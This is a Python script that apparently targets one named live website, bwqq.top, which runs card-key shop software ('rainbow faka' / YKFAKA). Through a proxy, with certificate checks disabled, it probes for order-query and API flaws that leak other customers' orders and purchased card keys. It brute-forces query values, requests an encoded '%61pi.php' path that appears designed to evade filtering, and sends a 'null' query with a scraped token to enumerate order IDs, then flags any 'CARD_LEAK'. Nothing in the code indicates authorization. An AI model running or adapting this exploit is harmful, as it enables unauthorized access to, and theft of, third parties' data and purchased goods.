#!/usr/bin/env python3
"""Quick probe bwqq.top — rainbow faka / YKFAKA surface."""
import json
import os
import re
import sys
import time
from urllib.parse import urljoin

import requests

requests.packages.urllib3.disable_warnings()

ROOT = "https://bwqq.top/"
SHOP = urljoin(ROOT, "shop/")
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/bwqq_probe.json"
PROXY = os.environ.get("PROXY_URL", "")
if not PROXY and os.path.isfile("/data/config/proxy.env"):
    for line in open("/data/config/proxy.env"):
        if line.startswith("PROXY_URL="):
            PROXY = line.strip().split("=", 1)[1].strip().strip('"').strip("'")

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]{10,14})")
TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)


def session():
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120", "Referer": ROOT})
    return s


def probe_base(s, base: str, label: str, orders_hint: int) -> dict:
    r = {"label": label, "base": base}
    try:
        home = s.get(base, timeout=30)
        r["home_len"] = len(home.text)
        r["faka_js"] = "assets/faka" in home.text
        r["showOrder"] = "showOrder" in home.text
        r["ykfaka"] = "YKFAKA" in home.text or "优卡" in home.text
    except Exception as e:
        r["home_error"] = str(e)[:100]
        return r

    try:
        gc = s.get(urljoin(base, "ajax.php?act=getcount"), timeout=20)
        r["getcount"] = gc.text[:300]
        orders = int(json.loads(gc.text).get("orders", 0))
        r["orders"] = orders
    except Exception as e:
        orders = orders_hint
        r["getcount_error"] = str(e)[:80]

    query_hits = []
    probes = [
        "1", "2", "12", "123", "888", "000", "2026", "bwqq", "bw",
        str(orders), str(orders - 1), str(max(orders - 100, 1)),
        "5201314", "123456", "888888",
    ]
    for q in probes:
        try:
            rq = s.get(base, params={"mod": "query", "data": q}, timeout=22)
            so = SHOW.findall(rq.text)
            fk = FAKA.findall(rq.text)
            if so or fk:
                query_hits.append({"data": q, "shows": so[:5], "faka": fk[:3]})
                print(f"{label} QUERY HIT {q} shows={len(so)}", flush=True)
        except Exception:
            pass
        time.sleep(0.12)
    r["query_hits"] = query_hits

    api_hits = []
    for suf in ["api.php?act=search&id=", "%61pi.php/?act=search&id="]:
        for oid in [orders, 1, 100, 1000]:
            try:
                ar = s.get(urljoin(base, suf + str(oid)), timeout=20)
                body = ar.text
                if body and len(body) > 15 and "No Act" not in body and '"code":-5' not in body:
                    if '"code":0' in body or SHOW.search(body):
                        api_hits.append({"id": oid, "suf": suf, "body": body[:300]})
                        print(f"{label} API HIT {oid}", flush=True)
            except Exception:
                pass
            time.sleep(0.1)
    r["api_hits"] = api_hits

    try:
        ar = s.get(urljoin(base, "%61pi.php/?act=search&id=1"), timeout=18)
        r["api_key_msg"] = ar.text[:200]
    except Exception as e:
        r["api_key_err"] = str(e)[:80]

    return r


def try_ykfaka(s) -> dict:
    r = {"pattern": "ykfaka_null_km", "VULN": False}
    try:
        home = s.get(ROOT, timeout=25)
        if "YKFAKA" not in home.text and "优卡" not in home.text:
            r["skip"] = "not_ykfaka"
            return r
        q = s.get(ROOT + "Query.html", timeout=20)
        tok = TOKEN_RE.search(q.text)
        if not tok:
            r["error"] = "no_token"
            return r
        token = tok.group(1) or tok.group(2)
        p = s.post(
            ROOT + "Query.html",
            data={"value": "null", "page": "1", "__token__": token},
            headers={"Referer": ROOT + "Query.html"},
            timeout=45,
        )
        ddids = list(dict.fromkeys(KM_RE.findall(p.text)))
        r["ddids"] = len(ddids)
        if ddids:
            r["VULN"] = True
            r["sample_ddids"] = ddids[:5]
            print(f"YKFAKA HIT ddids={len(ddids)}", flush=True)
    except Exception as e:
        r["error"] = str(e)[:100]
    return r


def main():
    s = session()
    report = {"target": "bwqq.top", "proxy": PROXY[:50] if PROXY else None}

    # root vs shop
    report["root_probe"] = probe_base(s, ROOT, "root", 0)
    orders = report["root_probe"].get("orders", 0)
    if SHOP != ROOT:
        s.headers["Referer"] = SHOP
        report["shop_probe"] = probe_base(s, SHOP, "shop", orders)

    report["ykfaka"] = try_ykfaka(session())
    root = report.get("root_probe", {})
    shop = report.get("shop_probe", {})
    report["CARD_LEAK"] = bool(
        root.get("query_hits")
        or root.get("api_hits")
        or shop.get("query_hits")
        or shop.get("api_hits")
        or report.get("ykfaka", {}).get("VULN")
    )

    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print(json.dumps(report, ensure_ascii=False, indent=2), flush=True)


if __name__ == "__main__":
    main()
